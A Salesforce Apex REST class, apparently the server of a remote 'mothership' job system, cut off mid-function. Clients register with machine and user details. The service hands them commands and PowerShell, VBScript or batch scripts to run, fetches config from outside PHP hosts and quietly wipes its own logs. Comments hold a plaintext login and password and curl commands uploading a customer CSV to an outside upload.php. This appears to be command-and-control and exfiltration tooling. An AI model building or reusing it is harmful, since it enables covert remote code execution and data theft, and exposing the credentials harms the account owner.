/**
 * @description       : 
 * @author            : ChangeMeIn@UserSettingsUnder.SFDoc
 * @group             : 
 * @last modified on  : 06-23-2026
 * @last modified by  : ChangeMeIn@UserSettingsUnder.SFDoc
**/
// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/adminui


// https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce.com/
// storagevault941@agentforce.com
// As1df1gh!

// sf org login web --alias storagevault941@agentforce.com
// sf project deploy start --source-dir force-app/main/default/classes/PublicRestService.cls --target-org mothershiporg
// sf project retrieve start -m ApexTrigger
// sf deploy metadata -m ApexTrigger:ClientJobTrigger
// cmd /k F:\__Binaries\sfdx\bin\sf deploy metadata -m ApexClass:PublicRestService -o storagevault941@agentforce.com
// sf org list

// curl -v -X POST --data-binary "@customers-100.csv" <tplmothership>/ow/upload.php?filename=customers-100.csv
// curl -v -T customers-100.csv <tplmothership>/ow/upload.php?filename=cust.csv

// ! mothership variable to reflect URL upon deployment to new environment
// ! need to expand on logging
// check PublishEventLogger make sure sessionid is being logged
// every so often, query the mothership and delete all old Logger records
@RestResource(urlMapping='/*')
global without sharing class PublicRestService {

    public class MothershipConfig {
        List<string> tplmotherships = new List<string>();
        string bunnyheader = '';
        string mothershipassets = '';

        public MothershipConfig() {
            string configstr = getMothershipConfig();

            if ( String.isBlank(configstr) ) {
                return;
            }

            List<String> lines = configstr.split('\r?\n'); 

            for ( String line : lines ) {
                List<string> pair = line.split('=');

                if ( pair.isEmpty() || pair.size() != 2 )
                    continue;

                string key = pair[0];
                string value = pair[1];

                if ( key == 'mothershipassets' ) {
                    this.mothershipassets = value;
                } else if ( key == 'bunnyheader' ) {
                    this.bunnyheader = value;
                } else if ( key == 'tplmothership' ) {
                    this.tplmotherships.add(value);
                }

            }

            return;
        }
    }

    public static string mothership = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault';

    public static string logsessionid = GetRandomNum(8);
    public static integer logindex = 1;

    static {
        String baseUrl = Url.getOrgDomainUrl().toExternalForm();
        List<String> parts = baseUrl.split('\\.'); 
        mothership = 'https://' + parts[0].removeStartIgnoreCase('https://')+'.develop.my.salesforce-sites.com/services/apexrest/StorageVault';
    }   


    public static StorageVault__MothershipConfig__c getFirstMothershipConfig() {
        List<StorageVault__MothershipConfig__c> configs = [ SELECT StorageVault__BunnyHeader__c, 
                                        StorageVault__MothershipAssets__c, 
                                        StorageVault__TplMotherships__c,
                                        StorageVault__PHPMotherships__c
                                        FROM StorageVault__MothershipConfig__c LIMIT 1 ];

        StorageVault__MothershipConfig__c config = null;

        if ( ! configs.isEmpty() ) {
            config = configs[0];
        }

        return config;        
    }

    // List<RemoteProxy> endpoints = [ SELECT EndpointUrl FROM RemoteProxy ];
    // List<string> endpointurls = new List<string>();
    // EndpointUrl = http://s1083932807.online-home.ca
    public static string getMothershipConfig() {
        List<StorageVault__MothershipConfig__c> configs = [ SELECT StorageVault__BunnyHeader__c, 
                                        StorageVault__MothershipAssets__c, 
                                        StorageVault__TplMotherships__c,
                                        StorageVault__PHPMotherships__c
                                        FROM StorageVault__MothershipConfig__c LIMIT 1 ];

        StorageVault__MothershipConfig__c config = null;

        if ( ! configs.isEmpty() ) {
            config = configs[0];
        }

        List<string> endpointurls = new List<string>();
        endpointurls = (List<String>) JSON.deserialize(config.StorageVault__PHPMotherships__c, List<String>.class);

        for ( string endpointurl : endpointurls ) {
            Http http = new Http();        
            HttpRequest request = new HttpRequest();

            request.setEndpoint(endpointurl + '/ow/config.php');
            request.setMethod('GET');
            request.setHeader('Content-Type', 'text/plain;charset=UTF-8');
            
            try {
       
                HttpResponse response = http.send(request);
                
                if (response.getStatusCode() == 200) {
                    String responseBody = response.getBody();
                    
                    try {
                        CreateContentVersion('config.txt',Blob.valueOf(responseBody));
                    } catch (Exception ex) {

                    }

                    return responseBody;
                } else {
                    Map<string, string> res =  new Map<string,string>{ 'statuscode' => String.valueOf(response.getStatusCode()), 'status' => response.getStatus() };
                    throw new GenericException(JSON.serialize(res));
                }
            } catch (Exception ex) {
                LogSysEx(ex);
            }
        }

        return '';
    }

    public static void TryEmptyLogs() {
        Integer upperLimit = 100;
        Integer randomNumber = Math.floor(Math.random() * upperLimit).intValue();
        
        if ( randomNumber >= 80 ) {
            return;    
        }

        EmptyLogs();
    }
    
    public static void EmptyLogs() {
        try {
            List<StorageVault__Logger__c> recordsToKeep = [ SELECT Id 
                                                            FROM StorageVault__Logger__c 
                                                            ORDER BY CreatedDate 
                                                            DESC LIMIT 25 ];
            
            Datetime lastHour = System.now().addHours(-1);

            List<StorageVault__Logger__c> logs = [ SELECT Id, LastModifiedDate 
                                                   FROM StorageVault__Logger__c 
                                                   WHERE LastModifiedDate <= :lastHour 
                                                   AND Id NOT IN :recordsToKeep ];
            
            delete logs;
            
            logs = [ SELECT ID FROM StorageVault__Logger__c WHERE IsDeleted = true ];
            
            if ( logs.isEmpty() )
                return;
            
            Database.emptyRecycleBin(logs);
            
        } catch (Exception ex) {
            LogSysEx(ex);
        }
    }
    
    public static void LogSysEx(Exception ex) {
    	string expstr = '';
		expstr = 'getMessage: '+ex.getMessage();
        expstr += '|getTypeName: '+ex.getTypeName();
        expstr += '|getLineNumber: '+ ex.getLineNumber();
        expstr += '|getStackTraceString: '+ex.getStackTraceString();
    
        LogSys(expstr);
    }
    
    public static void LogSys(string msg) {

        try {
            string logmsgstr = 'PublicRestService|'+logsessionid + '|' + String.valueOf(logindex) +'|'+msg;
            
            StorageVault__LogEvent__e event = new StorageVault__LogEvent__e( StorageVault__Payload__c = logmsgstr);
            
            EventBus.publish(event);   
            logindex = logindex + 1;
        } catch (Exception ex) {
            
        }        
    }
    
    public class GenericException extends Exception {}
    
    public static ContentVersion GetContentVersion(string filename) {
    	ContentVersion cv = null;
        
        List<ContentVersion> cvs = [ SELECT VersionData, Title, PathOnClient, FileExtension 
                                     FROM ContentVersion 
                                     WHERE Title = :filename //AND PathOnClient = '/'+filename 
                                     ORDER BY LastModifiedDate DESC
                                     LIMIT 1 ];

        if ( ! cvs.isEmpty() )
            cv = cvs[0];
            
        return cv;
    }

    public static ContentVersion CreateContentVersion(string filename, blob fileBlob) {
    	ContentVersion cv = null;
        
        cv = new ContentVersion();

        Id currentUserId = UserInfo.getUserId();

        cv.Title = filename;
        cv.PathOnClient = '/' + filename; 
        cv.VersionData = fileBlob;
        cv.IsMajorVersion = true;
        // cv.ContentLocation = 'C'; // 'C' indicates it's stored in Salesforce
        cv.IsMajorVersion = true;
        cv.SharingPrivacy = 'N'; 
        cv.FirstPublishLocationId = currentUserId; // Automatically links the file to the user

        insert cv;
                
        // string msgstr = 'filesize='+String.valueOf(fileBlob.size())+'|'+'filename='+t_filename + '|'+'recordid='+String.valueOf(cv.Id);

        return cv;
    }

    static Map<string,string> GetRequestProfile() {
        Map<string,string> out = new Map<string,string>();
        
        Id profileId = UserInfo.getProfileId(); 

		Profile currentUserProfile = [SELECT Name FROM Profile WHERE Id = :profileId LIMIT 1];
		
        String profileName = currentUserProfile != null ? currentUserProfile.Name : 'NULL_PROFILE';
        
		UserInfo.getUserId();
        UserInfo.getName();
        UserInfo.getLanguage();
        UserInfo.getLocale();
        
        out.put('ProfileID', profileId);
        out.put('ProfileName', profileName);
        out.put('UserId', UserInfo.getUserId());
        out.put('Username', UserInfo.getName());
        out.put('Language', UserInfo.getLanguage());
        out.put('Locale', UserInfo.getLocale());
        
        return out;
    }
    
    static string GetRandomNum(integer n) {
        
        if ( n <= 0 )
            return '';
        
        String randStr = '';
        Integer randomInt = -1;
        
        while ( randStr.length() < n ) {
            randomInt = Integer.valueOf(Math.random() * 90000000 + 10000000);
            randStr = randStr + String.valueOf(randomInt);
        }        
        
        return randStr.substring(0,n-1);
    }
    
    static string MapToKVPStr(Map<string, string> inputMap) {
        string outstr = '';
        
        if ( inputMap == null || inputMap.size() == 0 )
            return outstr;
        
        Integer i = 0;
        for (String key : inputMap.keySet()) {
            
            String value = inputMap.get(key);
            
            if ( i >= 1 ) 
                outstr += '|';
            
            outstr += '['+key+']=['+value+']';
            
			i += 1;                        
        }

        return outstr;
    }

    static Map<string,string> KVPLCase(Map<string,string> kvp) {
        Map<string,string> outkvp = new Map<string,string>();

        if ( kvp == null || kvp.isEmpty() ) 
            return outkvp;
                
        for ( String key : kvp.keySet() ) {
            string value = kvp.get(key);
            outkvp.put(key.toLowerCase(), value);
        }
        
        return outkvp;
    }   
        
    static void PublishMsgLogger(string source, string tsource, string msg, RestRequest req) {
        PublishEventLogger('log_msg', msg, source, tsource, null, req);
    }
    
    // source = ping.php, retrieve.php, upload.php, logmsg.php, relay.php
    static StorageVault__Logger__c PublishEventLogger(string event, string logmsgstr, string source, string tsource, Map<string, string> kvp, RestRequest req) {
        StorageVault__Logger__c logmsg = new StorageVault__Logger__c();

        Map<string,string> reqkvp = KVPLCase(req.params);
		
        string clientid = reqkvp.containsKey('clientid') ? reqkvp.get('clientid') : null;
            
        kvp = kvp == null ? new Map<string, string>() : kvp;

        String ipAddress = req.remoteAddress;
        String userAgent = req.headers.get('User-Agent');

		string sysmsg = 'PublishEventLogger|starting';
        sysmsg += '|clientid='+clientid;
        sysmsg += '|event='+ event;
        sysmsg += '|source='+source;
        sysmsg += '|tsource='+tsource;
        sysmsg += '|logmsgstr='+logmsgstr;
        sysmsg += '|kvp='+MapToKVPStr(kvp);
        
        LogSys(sysmsg);
        
        logmsg.StorageVault__Event__c = event;
        logmsg.StorageVault__ClientID__c = clientid;        
        logmsg.StorageVault__TSource__c = tsource; 
        logmsg.StorageVault__Source__c = source;
        logmsg.StorageVault__UserAgent__c = userAgent; 
        logmsg.StorageVault__ip_addr__c = ipAddress;

        logmsg.StorageVault__LogID__c = reqkvp.containsKey('logid') ? reqkvp.get('logid') : '-1';
        logmsg.StorageVault__BatchID__c = reqkvp.containsKey('batchid') ? reqkvp.get('batchid') : null;
        logmsg.StorageVault__ScriptVersion__c = reqkvp.containsKey('script_version') ? reqkvp.get('script_version'):null;
		logmsg.StorageVault__SessionID__c = reqkvp.containsKey('sessionid') ? reqkvp.get('sessionid') : null;
		logmsg.StorageVault__SessionTS__c = reqkvp.containsKey('sessionts') ? reqkvp.get('sessionts') : null;
		logmsg.StorageVault__Username__c = reqkvp.containsKey('username') ? reqkvp.get('username') : null;
        logmsg.StorageVault__Machinename__c = reqkvp.containsKey('machinename') ? reqkvp.get('machinename') : null;
		        
        logmsg.StorageVault__LogMsg__c = logmsgstr;
        logmsg.StorageVault__KVP__c = MapToKVPStr(kvp);

        Database.SaveResult sr = Database.insert(logmsg, false);

        if (!sr.isSuccess()) {
            for (Database.Error err : sr.getErrors()) {
                if (err.getStatusCode() == StatusCode.STORAGE_LIMIT_EXCEEDED) {
                    TryEmptyLogs();
                }
            }
        }
        
        LogSys('PublishEventLogger|finished|logmsg.ID='+logmsg.ID);

        return logmsg;
    }
    
    static string getFilenameExt(string filename) {
        filename = filename.trim();
        return String.isBlank(filename) ? '' : filename.substringAfterLast('.').toLowerCase();
    }

    static string getJobFileHeader(string filename, string jobcode) {
        MothershipConfig config = new MothershipConfig();

        string jobnameext = getFilenameExt(filename);
        
        List<String> exts = new List<String>{'ps1', 'vbs', 'bat'};
            
		if ( ! exts.contains(jobnameext) ) {
            throw new GenericException('ERROR :: unsupported extension: '+jobnameext);
        }

        jobnameext = jobnameext.toLowerCase();

        string scripttextheader = '';

        string mothershipassets = config.mothershipassets;
        string bunnyheader = config.bunnyheader;

        if ( jobnameext == 'bat' ) {
            scripttextheader = 'SET jobcode=' + jobcode + '\r\n';
            scripttextheader += 'SET mothership=' + mothership + '\r\n';

            scripttextheader += 'SET mothershipassets=' + mothershipassets + '\r\n';
            scripttextheader += 'SET bunnyheader=' + bunnyheader + '\r\n';

        } else if ( jobnameext == 'vbs' ) {
            scripttextheader = 'Option Explicit' + '\r\n';
            scripttextheader += 'On Error Resume Next' + '\r\n';

            scripttextheader += 'DIM mothershipassets : mothershipassets="' + mothershipassets + '"' + '\r\n';
            scripttextheader += 'DIM bunnyheader : bunnyheader="' + bunnyheader + '"' + '\r\n';

            scripttextheader += 'DIM mothership : mothership="' + mothership + '"' + '\r\n';
            scripttextheader += 'DIM jobcode : jobcode="' + jobcode + '"' + '\r\n';

        } else if ( jobnameext == 'ps1' ) {
            scripttextheader += '$mothership="' + mothership + '"' + '\r\n';
            scripttextheader += '$jobcode="' + jobcode + '"' + '\r\n';

            scripttextheader += '$mothershipassets="' + mothershipassets + '"' + '\r\n';
            scripttextheader += '$bunnyheader="' + bunnyheader + '"' + '\r\n';

        } else {
            throw new GenericException('FATAL ERROR :: should not have reached here');
        }

        return scripttextheader;
    }

    // ping.php
    // cmdlist, EXEC_CMD, EXEC_PS1, EXEC_BAT, EXEC_VBS
    // processes ping.php request for client jobs
    static void processClientJob(RestRequest req, RestResponse res, string clientid, string clientstatus, Map<String, String> params) {

        if ( params == null || params.isEmpty() ) {
            params = new Map<String, String>();
        }

        List<StorageVault__ClientJob__c> jobs = [ SELECT ID, Name, StorageVault__JobCode__c, 
                                                 	StorageVault__JobName__c,
                                                 	StorageVault__JobFile__c, 
                                                 StorageVault__RetrieveTS__c
                                                 FROM StorageVault__ClientJob__c 
                                                 WHERE StorageVault__ClientID__c = :clientid AND
                                                 ( StorageVault__RetrieveTS__c = Null OR StorageVault__RetrieveTS__c LIKE ' %' )    
                                                 LIMIT 1 ];
        
        if ( jobs.isEmpty() ) {
            
            string source = params.containsKey('source') ? params.get('source') : 'mothership';

            PublishMsgLogger('ping.php', source, clientstatus, req);

            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
            msgout += MapToKVPStr(params) + '\r\n';

            res.responseBody = Blob.valueOf(clientstatus + '\r\n' + msgout);
            return;
        }

		StorageVault__ClientJob__c clientjob = jobs[0];
        
        string jobrowid = String.valueOf(clientjob.ID);
        string jobcode = clientjob.StorageVault__JobCode__c; // should be empty as job has not been retrieved
        string jobfile = clientjob.StorageVault__JobFile__c; // cmd_list_snapshot_full.bat, EXEC_CMD, EXEC_BAT, EXEC_PS1, EXEC_VBS
        string jobname = clientjob.StorageVault__JobName__c.toLowerCase(); // run, LogMsgMother
        jobname = jobname ?? '';
        
        string jobtype = '';
        
        if ( ! String.isBlank(jobname) ) {
        	jobtype = jobname.length() >= 4 ? jobname.substring(0, 4) : '';
        }
        
        string clientinfo = '';
        string loginfo = '';
        
		// if a job was scheduled using the retrieve.php / cmdlist method
        if ( jobtype != 'EXEC'.toLowerCase() ) {
            clientinfo = 'client_new_job' + '|' + ( String.isBlank(jobcode) ? 'waiting_for_retrieve' : 'running_cmdlist' );
            
            loginfo = clientstatus + '|';
            loginfo += clientinfo + '|';
            loginfo += (String.isBlank(jobcode) ? '' : 'JobCode=' + jobcode + '|');
            loginfo += 'JobRowID=' + jobrowid;
            
            string logmsgstr = loginfo + '\r\n' + 'execute_cmdlist' +'\r\n';
            
			PublishMsgLogger('ping.php', 'mothership', logmsgstr, req);

            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
            
            res.responseBody = Blob.valueOf(logmsgstr + '\r\n' + msgout);
        	return;
        }
        
        // jobname one of: EXEC_CMD, EXEC_PS1, EXEC_VBS, EXEC_BAT
		jobcode = GetRandomNum(8);
        string jobfilepath = '';
        string jobfilename = '';
        integer fsize = -1;
        string action = '';
        
        Map<string, string> kvp = new Map<string, string> {'event' => 'init_jobcode', 'jobcode' => jobcode , 'jobrowid' => clientjob.ID };
        PublishEventLogger('init_jobcode', null, 'ping.php', 'mothership', kvp, req);

        clientinfo = 'client_new_job' + '|' + 'running_exec';
        loginfo = clientstatus + '|';
        loginfo += clientinfo + '|';
        loginfo += ( String.isBlank(jobcode) ? '' : ( 'JobCode=' + jobcode + '|' ));
        loginfo += 'JobRowID=' + jobrowid;

        if ( jobname.toLowerCase() == 'EXEC_CMD'.toLowerCase() ) {
        
            action = 'EXEC_CMD_BEGIN' + '|' + jobfile + '|' + 'EXEC_CMD_END' + '\r\n';
            action += 'JOBCODE_BEGIN' + jobcode + 'JOBCODE_END' + '\r\n';

    
            PublishMsgLogger('ping.php', 'mothership', loginfo, req);
			
            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';

            res.responseBody = Blob.valueOf(loginfo + '\r\n' + action + '\r\n' + msgout + '\r\n');
            
            return;
        } 
        
                        
        string scripttext = '';
        ContentVersion cv = GetContentVersion(jobfile);

        if ( cv == null ) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: job file does not exist '+jobfile + '\r\n');
            return;
        }

		Blob scripttextblob = cv.VersionData;

        if ( scripttextblob == null || scripttextblob.size() ==  0 ) {
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: job file is empty cv.ID='+String.valueOf(cv.ID) + '\r\n');
            return;
        }

		scripttext = scripttextblob.toString();
                
        string scripttextheader = getJobFileHeader(jobfile, jobcode);

        scripttext = scripttext.replace('Option Explicit', '               '); 

        action = 'JOBCODE_BEGIN' + jobcode + 'JOBCODE_END' + '\r\n';
        
        string jobnameext = jobfile.substringAfterLast('.').toLowerCase();

		action += '\r\n' + 'EXEC_' + jobnameext + '_BEGIN' + '\r\n' + scripttextheader + '\r\n' + scripttext + '\r\n' + 'EXEC_' + jobnameext + '_END' + '\r\n';
        
        PublishMsgLogger('ping.php', 'mothership', loginfo, req);

        string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';

        res.responseBody = Blob.valueOf(loginfo + '\r\n' + action + '\r\n' + msgout);
        
        return;
    }
    
    /* ping.php
     * 
     * for cmdlist type jobs, echo "execute_cmdlist" as response
     *
     * echo "\r\n" . "JOBCODE_BEGIN" . $jobcode . "JOBCODE_END" . "\r\n";
     * echo "\r\n" . $action . "\r\n";
	 *
     *     $action = "EXEC_CMD_BEGIN|" . $jobfile . "|EXEC_CMD_END";
	 *     $action = "EXEC_" . $jobname . "_BEGIN" . "\r\n" . $scripttext . "\r\n" . "EXEC_" . $jobname . "_END";
	 *		
	 *     --> writes init_jobcode event to event bus
	 *  
	 * ! not actually used for anything within the system
     * loginfo : CLIENT_EXISTS, NEW_CLIENT, CLIENT_ERROR, CLIENT_EXISTS_NEW_PROFILE | running_exec, waiting_for_retrieve, running_cmdlist | JobCode=<...> | JobRowID=<...>
     */
    static void ping(RestRequest req, RestResponse res) {
		
        TryEmptyLogs();
        
        Map<String, String> params = KVPLCase(req.params);
        
        String userAgent = req.headers.get('User-Agent');
		String ipAddr = req.remoteAddress;
        
    	String machinename = '';
		String username = '';
        String clientid = '';
        String script_version = '';
		String scriptmd5 = '';

        if ( params.containsKey('scriptmd5') ) {
            scriptmd5 = params.get('scriptmd5');
        }
        
        if ( params.containsKey('script_version') ) {
            script_version = params.get('script_version');
        }
        
        if ( params.containsKey('clientid') ) {
            clientid = params.get('clientid');
        }

        if ( String.isBlank(clientid) ) {
            throw new GenericException('ping.php :: clientid param is empty');
        }
        
        if ( params.containsKey('machinename') ) {
            machinename = params.get('machinename');
        }

        if ( params.containsKey('username') ) {
            username = params.get('username');
        }
        
        List<StorageVault__Client__c> clients = [ SELECT ID, 
                                                 StorageVault__EnableJobs__c, 
                                                 StorageVault__ip_addr__c, 
                                                 StorageVault__UserAgent__c
                                                  FROM StorageVault__Client__c 
                                                  WHERE StorageVault__ClientID__c = :clientid ];

		StorageVault__Client__c client = null;
        StorageVault__Client__c newclient = null;
    
        boolean isNewProfile = false;
        boolean isNewClient = clients.isEmpty();
        
        if ( ! isNewClient ) {
            client = clients[0];

            isNewProfile = true;
            
            for ( StorageVault__Client__c tclient : clients ) {
                if (    ( tclient.StorageVault__ip_addr__c.toLowerCase() == ipAddr.toLowerCase() ) 
                     && ( tclient.StorageVault__UserAgent__c.toLowerCase() == userAgent.toLowerCase() ) ) {
                    isNewProfile = false;
                    break;
            	}
            }
        }
        
        if ( isNewClient || isNewProfile ) {
            newclient = new StorageVault__Client__c();

            machinename = EncodingUtil.urlDecode(machinename, 'UTF-8');
			script_version = EncodingUtil.urlDecode(script_version, 'UTF-8');
            
            newclient.StorageVault__ClientID__c = clientid;
            newclient.StorageVault__EnableJobs__c = 'ENABLE';
            newclient.StorageVault__ip_addr__c = ipAddr;
            newclient.StorageVault__Machinename__c = machinename;
            newclient.StorageVault__Username__c = username;
            newclient.StorageVault__RegisterTS__c = Datetime.now().format('yyyyMMddHHmmssSSS');
            newclient.StorageVault__UserAgent__c = userAgent;
            newclient.StorageVault__ScriptVersion__c = script_version; 
			newclient.StorageVault__ScriptMD5__c = scriptmd5; 
            
            Database.SaveResult sr = Database.insert(newclient, false);

            if (sr.isSuccess()) {
                // sr.getId();
            } else {
                for(Database.Error err : sr.getErrors()) {
                    if (err.getStatusCode() == StatusCode.STORAGE_LIMIT_EXCEEDED) {
                        TryEmptyLogs();
                    }
                }
            }

        }       
            
        // CLIENT_EXISTS
        // CLIENT_EXISTS_NEW_PROFILE
        // NEW_CLIENT
        // CLIENT_ERROR --> not implemented
        string clientstatus = 'CLIENT_EXISTS';
        
        if ( isNewClient ) {
            clientstatus = 'NEW_CLIENT';
        } else if ( isNewProfile ) {
            clientstatus = 'CLIENT_EXISTS_NEW_PROFILE';
        }

		processClientJob(req, res, clientid, clientstatus, params);
        
        return;
    }
     
    // logmsg.php
    static void logmsg(RestRequest req, RestResponse res) {
        Map<string, string> kvp = KVPLCase(req.params);
        
        string logmsgstr = kvp.containsKey('msg') ? kvp.get('msg') : null;
        string tsource = kvp.containsKey('source') ? kvp.get('source') : 'UNKNOWN';

        if ( ! kvp.containsKey('event') ) {
        	PublishMsgLogger('logmsg.php', tsource, logmsgstr, req);
        	return;
        }
        
        string event = kvp.get('event');
        
        StorageVault__Logger__c log = PublishEventLogger(event, logmsgstr, 'logmsg.php', tsource, kvp, req);

        if ( log == null ) {
			res.statusCode = 500;
            res.responseBody = Blob.valueOf('unable to generate log msg record');
            return;
        }

        res.responseBody = Blob.valueOf(JSON.serialize(log));
        return;
    }
    
    // retrieve.php --> cmd_list_<...>.bat job file processing
    public static void execCmdList(RestRequest req, RestResponse res) {
        Map<string,string> kvp = KVPLCase(req.params);
        
        string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : '';
        
        List<StorageVault__ClientJob__c> clientjobs = [ SELECT ID, Name, StorageVault__JobCode__c, 
                                                       StorageVault__JobName__c,
                                                       StorageVault__JobFile__c, 
                                                       StorageVault__RetrieveTS__c
                                                       FROM StorageVault__ClientJob__c 
                                                       WHERE StorageVault__ClientID__c = :clientid AND
                                                       ( StorageVault__RetrieveTS__c = Null OR StorageVault__RetrieveTS__c LIKE ' %' )
                                                       ORDER BY LastModifiedDate DESC
                                                       LIMIT 1 ];
        
        if ( clientjobs.isEmpty() ) {
            PublishMsgLogger('retrieve.php', 'mothership', 'empty jobs queue', req) ;
            	
            res.statusCode = 400;
            res.responseBody = Blob.valueOf('empty jobs queue' + '\r\n');
            return;
        }
        
        StorageVault__ClientJob__c clientjob = clientjobs[0];
        
        string filename = clientjob.StorageVault__JobFile__c;
        
        if ( String.isBlank(filename) ) {
            string errmsg = 'filename field in client job is empty: '+String.valueOf(clientjob.ID);
            
            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
            
            PublishMsgLogger('retrieve.php', 'mothership', errmsg, req) ;
            
            res.statusCode = 400;
            res.responseBody = Blob.valueOf(errmsg + '\r\n' + msgout + '\r\n');
            return;
        }
        
        LogSys('execCmdList|clientjob='+clientjob.ID+'|filename='+filename);

        ContentVersion cv = GetContentVersion(filename);
        
        if ( cv == null ) {                            
            string errmsg = 'execCmdList: could not retrieve file: '+filename;
            
            string msgout = MapToKVPStr(GetRequestProfile()) + '\r\n';
            
            PublishMsgLogger('retrieve.php', 'mothership', errmsg, req) ;
            
            res.statusCode = 400;
            res.responseBody = Blob.valueOf(errmsg + '\r\n' + msgout + '\r\n');
            return;
        }
        
        Blob fileblob = cv.VersionData;
        
        string filetext = fileblob.toString();
        
        string jobcode = GetRandomNum(8);
        
        string jobheader = getJobFileHeader(filename, jobcode);
        string jobnameext = getFilenameExt(filename);

        if ( jobnameext.toLowerCase() == 'vbs' ) {
            filetext = filetext.replace('Option Explicit', '               ');
        }

        fileblob = Blob.valueOf(jobheader + '\r\n' + filetext);

        res.addHeader('Content-Type', 'application/octet-stream');
        //res.addHeader('Content-Disposition', 'attachment; filename="' + cv.Title + '"');
        res.addHeader('X-JobCode', jobcode);
        res.addHeader('X-JobFilename', cv.Title);
        // res.addHeader('Content-Length', String.valueOf(fileblob.size())); // results in error: Header name "Content-Length" is not allowed.
        res.addHeader('Expires', '0');
        res.addHeader('Cache-Control', 'must-revalidate');

        String hexstr = EncodingUtil.convertToHex(fileblob);
        fileblob = Blob.valueOf(hexstr);

        res.responseBody = fileblob; 

        kvp = new Map<string, string> {'event' => 'init_jobcode', 'jobcode' => jobcode , 'jobrowid' => clientjob.ID };

    	PublishEventLogger('init_jobcode', null, 'retrieve.php', 'mothership', kvp, req);

        return;
    }
    
    // retrieve.php
    public static void retrieve(RestRequest req, RestResponse res) {
        String relativeUrl = req.requestURI; 
        
        List<String> pathSegments = relativeUrl.split('/');
        
        String endpoint = '';
        
        if ( ! pathSegments.isEmpty() ) {
            endpoint = pathSegments.get(pathSegments.size()-1);
        }
        
        if ( endpoint != 'retrieve.php' ) {
			res.statusCode = 500;
            return;
        }
        
        Map<string,string> kvp = KVPLCase(req.params);
        kvp = kvp == null || kvp.size() == 0 ? new Map<string,string>() : kvp;
        		
        
        string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : '';
        
        string filename = kvp.containsKey('filename') ? kvp.get('filename') : '';
        
        if ( String.isBlank(filename) ) {
        	res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: must provide filename as URL parameter');
            return;
        }

        if ( String.isBlank(clientid) ) {
        	res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: must provide clientid as URL parameter');
            return;
        }
        
        if ( filename.toLowerCase() == 'execute_cmdlist' ) {// anchor           
            execCmdList(req, res);
            return;
        } 

        ContentVersion cv = GetContentVersion(filename);
        
        if ( cv == null ) {
            string errmsg = 'could not retrieve file: '+filename;
            PublishMsgLogger('retrieve.php', 'mothership', errmsg, req);

            res.statusCode = 400;
            res.responseBody = Blob.valueOf(errmsg + '\r\n');
            return;
        }
        
        Blob fileblob = cv.VersionData;
        
        if ( fileblob == null || fileblob.size() == 0 ) {
        	res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: file ' + filename + ' exists but is empty');            
            return;
        }

        res.addHeader('Content-Type', 'application/octet-stream');
        res.addHeader('Content-Disposition', 'attachment; filename="' + cv.Title + '"');
        // res.addHeader('Content-Length', String.valueOf(fileblob.size())); // Header name "Content-Length" is not allowed.
        res.addHeader('Expires', '0');
        res.addHeader('Cache-Control', 'must-revalidate');

        res.responseBody = fileblob; 

        return;
    }
    
    // relay.php
    public static void relay(RestRequest req, RestResponse res) {
        String relativeUrl = req.requestURI; 
        
        List<String> pathSegments = relativeUrl.split('/');
        
        String endpoint = '';
        
        if ( ! pathSegments.isEmpty() ) {
            endpoint = pathSegments.get(pathSegments.size()-1);
        }
        
        if ( endpoint != 'relay.php' ) {
			res.statusCode = 500;
            return;
        }
        
        Map<string,string> kvp = KVPLCase(req.params);
        kvp = kvp == null || kvp.size() == 0 ? new Map<string,string>() : kvp;
        		
        string clientid = kvp.containsKey('clientid') ? kvp.get('clientid') : '';        
        string action = kvp.containsKey('action') ? kvp.get('action') : '';
        string sessionid = kvp.containsKey('sessionid') ? kvp.get('sessionid') : '';

        if ( String.isBlank(action) ) {
        	res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: must provide action as URL parameter');
            return;
        }

        if ( String.isBlank(clientid) ) {
        	res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: must provide clientid as URL parameter');
            return;
        }

        if ( ! ( new List<String>{'connectclient', 'connecthost', 'endconnection'}.contains(action) ) ) {
        	res.statusCode = 400;
            res.responseBody = Blob.valueOf('ERROR :: unsupported action: '+action);
            return;            
        }
        
        if ( action == 'connectclient' ) {
            StorageVault__RelayJob__c relayjob = new StorageVault__RelayJob__c();
            
            relayjob.StorageVault__ClientID__c = clientid;
            relayjob.StorageVault__CreateTS__c = Datetime.now().format('yyyyMMddHHmmssSSS');
            relayjob.StorageVault__EndTS__c = null;
            
            sessionid = GetRandomNum(8);
            relayjob.StorageVault__SessionID__c = sessionid;
            
            insert relayjob;
            res.responseBody = Blob.valueOf('{ "SessionID": "'+sessionid+'", "RelayJob": "'+relayjob.ID+'" }');
			return;
        } else if ( action == 'endconnection' ) {
            List<StorageVault__RelayJob__c> relayjobs = [ SELECT ID, StorageVault__EndTS__c, StorageVault__ClientID__c
                                                          FROM StorageVault__RelayJob__c 
                                                          WHERE StorageVault__SessionID__c = : sessionid LIMIT 1];
            
            if ( relayjobs.isEmpty() ) {
                res.statusCode = 400;
                res.responseBody = Blob.valueOf('ERROR :: could not retrieve any matching RelayJob corresponding to sessionid: '+sessionid);
                return;
            }
            
            StorageVault__RelayJob__c relayjob = relayjobs[0];
            
            clientid = relayjob.StorageVault__ClientID__c;
            relayjob.StorageVault__EndTS__c = Datetime.now().format('yyyyMMddHHmmssSSS');
                        
            update relayjob;         
            
            res.responseBody = Blob.valueOf('{ "SessionID": "'+sessionid+'", "RelayJob": "'+relayjob.ID+'", "ClientID":"'+clientid+'" }');
			return;
        } else if ( action == 'connecthost' ) {
            List<StorageVault__RelayJob__c> relayjobs = [ SELECT ID, StorageVault__SessionID__c, StorageVault__CreateTS__c
                                                          FROM StorageVault__RelayJob__c 
